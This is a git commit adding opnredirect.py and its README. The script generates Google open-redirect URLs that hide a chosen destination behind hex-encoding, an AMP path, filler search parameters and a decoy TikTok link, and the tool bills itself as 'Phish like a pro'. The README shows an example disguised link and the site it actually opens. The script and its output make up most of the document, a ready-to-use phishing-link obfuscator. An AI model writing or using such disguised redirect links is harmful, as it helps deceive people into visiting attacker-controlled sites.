a3a25c22cd80e9667d2341ec3855def1ba4714b9
Krystian Bajno <krystian.bajno@gmail.com>
2024-07-11 02:01:54 +0200

    up

--- README.md
+++ README.md
@@ -1,1 +1,44 @@
-# google-openredirect-generator
+# opnredirect.py
+### What URL does it open?
+```
+https://google.com/url?&sca_esv=54722a0b5ffac30e&ei=oxyPZvbsCuLYwPAPsfSl2Ak&ved=0ahUKEwi2yuO1052HAxViLBAIHTF6CZsQ4dUDCA4&uact=5&oq=search&gs_lp=Egxnd3Mtd2l6LXNlcnAiBnNlYXJjaDIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzINEAAYgAQYsAMYQxiKBTINEAAYgAQYsAMYQxiKBUjYWVAAWABwA3gBkAEAmAEAoAEAqgEAuAEDyAEAmAIDoAIhmAMAiAYBkAYKkgcBM6AHAA&sclient=gws-wiz-serp&q=%68%74%74%70%73%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D%2F%61%6D%70%2F%73%2F%62%61%79%63%6F%64%65%2E%65%75&search=tiktok.com/@predictable/video/7384779117729713441&action=play
+```
+### Valid answer is:
+```
+https://baycode.eu
+```
+
+### Usage
+                                                         /$$ /$$                                 /$$                           
+                                                        | $$|__/                                | $$                           
+  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$       /$$$$$$  /$$   /$$
+ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$ /$$__  $$ /$$__  $$ /$$_____/|_  $$_/      /$$__  $$| $$  | $$
+| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/| $$$$$$$$| $$  | $$| $$| $$  \__/| $$$$$$$$| $$        | $$       | $$  \ $$| $$  | $$
+| $$  | $$| $$  | $$| $$  | $$| $$      | $$_____/| $$  | $$| $$| $$      | $$_____/| $$        | $$ /$$   | $$  | $$| $$  | $$
+|  $$$$$$/| $$$$$$$/| $$  | $$| $$      |  $$$$$$$|  $$$$$$$| $$| $$      |  $$$$$$$|  $$$$$$$  |  $$$$//$$| $$$$$$$/|  $$$$$$$
+ \______/ | $$____/ |__/  |__/|__/       \_______/ \_______/|__/|__/       \_______/ \_______/   \___/ |__/| $$____/  \____  $$
+          | $$                                                                                             | $$       /$$  | $$
+          | $$                                                                                             | $$      |  $$$$$$/
+          |__/                                                                                             |__/       \______/ 
+
+                                                                                                            Krystian Bajno 2024
+
+usage: opnredirect.py [-h] [--deception DECEPTION] [--trash TRASH] url
+
+Phish like a pro
+
+positional arguments:
+  url                   URL to redirect
+
+options:
+  -h, --help            show this help message and exit
+  --deception DECEPTION
+                        Override deception URL.
+  --trash TRASH         Override trash.
+
+### Examples
+```
+python3 opnredirect.py baycode.eu
+
+https://google.com/url?&sca_esv=54722a0b5ffac30e&ei=oxyPZvbsCuLYwPAPsfSl2Ak&ved=0ahUKEwi2yuO1052HAxViLBAIHTF6CZsQ4dUDCA4&uact=5&oq=search&gs_lp=Egxnd3Mtd2l6LXNlcnAiBnNlYXJjaDIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzINEAAYgAQYsAMYQxiKBTINEAAYgAQYsAMYQxiKBUjYWVAAWABwA3gBkAEAmAEAoAEAqgEAuAEDyAEAmAIDoAIhmAMAiAYBkAYKkgcBM6AHAA&sclient=gws-wiz-serp&q=%68%74%74%70%73%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D%2F%61%6D%70%2F%73%2F%62%61%79%63%6F%64%65%2E%65%75&search=tiktok.com/@predictable/video/7384779117729713441&action=play
+```
---
+++ opnredirect.py
@@ -0,0 +1,60 @@
+import argparse
+
+# Reset
+Color_Off='\033[0m'       # Text Reset
+
+# Regular Colors
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Cyan='\033[0;36m'         # Cyan
+
+banner = f"""
+{Green}                                                         /$$ /$$                                 /$$                           
+                                                        | $$|__/                                | $$                           
+  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$       /$$$$$$  /$$   /$$
+ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$ /$$__  $$ /$$__  $$ /$$_____/|_  $$_/      /$$__  $$| $$  | $$
+| $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\__/| $$$$$$$$| $$  | $$| $$| $$  \\__/| $$$$$$$$| $$        | $$       | $$  \\ $$| $$  | $$
+| $$  | $$| $$  | $$| $$  | $$| $$      | $$_____/| $$  | $$| $$| $$      | $$_____/| $$        | $$ /$$   | $$  | $$| $$  | $$
+|  $$$$$$/| $$$$$$$/| $$  | $$| $$      |  $$$$$$$|  $$$$$$$| $$| $$      |  $$$$$$$|  $$$$$$$  |  $$$$//$$| $$$$$$$/|  $$$$$$$
+ \\______/ | $$____/ |__/  |__/|__/       \\_______/ \\_______/|__/|__/       \\_______/ \\_______/   \\___/ |__/| $$____/  \\____  $$
+          | $$                                                                                             | $$       /$$  | $$
+          | $$                                                                                             | $$      |  $$$$$$/
+          |__/                                                                                             |__/       \\______/ 
+{Color_Off}
+                                                                                                            Krystian Bajno 2024
+"""
+
+
+def percent_double_urlencode_ascii(s):
+    return ''.join(['%{:02X}'.format(ord(c)) for c in s])
+
+def generate_redirect(url, deception, trash):
+    target = percent_double_urlencode_ascii(url)
+    q = percent_double_urlencode_ascii("https://google.com/amp/s/")
+    redir = f"https://google.com/url?{trash}&q={q}{target}{deception}"
+    print(redir)
+
+
+def main():
+    print(banner)
+    parser = argparse.ArgumentParser("opnredirect.py", description="Phish like a pro")
+    parser.add_argument("url", help="URL to redirect", type=str)
+    deception = "&search=tiktok.com/@predictable/video/7384779117729713441&action=play" # deception
+    trash = "&sca_esv=54722a0b5ffac30e&ei=oxyPZvbsCuLYwPAPsfSl2Ak&ved=0ahUKEwi2yuO1052HAxViLBAIHTF6CZsQ4dUDCA4&uact=5&oq=search&gs_lp=Egxnd3Mtd2l6LXNlcnAiBnNlYXJjaDIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzIKEAAYsAMY1gQYRzINEAAYgAQYsAMYQxiKBTINEAAYgAQYsAMYQxiKBUjYWVAAWABwA3gBkAEAmAEAoAEAqgEAuAEDyAEAmAIDoAIhmAMAiAYBkAYKkgcBM6AHAA&sclient=gws-wiz-serp"
+    
+    parser.add_argument("--deception", action='store',  help='Override deception URL.')
+    parser.add_argument("--trash", action='store', required=False, help='Override trash.')
+
+    args = parser.parse_args()
+    
+    if args.deception:
+        print(args.deception)
+        deception = args.deception 
+            
+    if args.trash: 
+        trash = args.trash  
+        
+    generate_redirect(args.url, deception, trash)
+
+if __name__ == "__main__":
+    main() 
